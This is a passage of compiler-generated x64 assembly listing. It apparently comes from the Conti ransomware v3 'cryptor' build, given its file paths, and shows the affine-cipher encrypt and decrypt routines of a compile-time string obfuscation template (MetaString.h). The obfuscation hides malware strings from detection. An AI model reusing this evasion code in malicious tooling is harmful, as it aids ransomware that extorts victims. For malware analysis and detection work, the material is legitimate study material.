  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 64	 add	 r8d, 100		; 00000064H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 23	 sub	 eax, 35			; 00000023H
  00006	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1f	 imul	 r8d, eax, 31
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 23	 add	 r8d, 35			; 00000023H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 28	 sub	 eax, 40			; 00000028H
  00006	44 6b c0 19	 imul	 r8d, eax, 25

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3d	 imul	 r8d, eax, 61		; 0000003dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 28	 add	 r8d, 40			; 00000028H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 49 00 00 00	 mov	 ecx, 73			; 00000049H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 49	 add	 r8d, 73			; 00000049H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
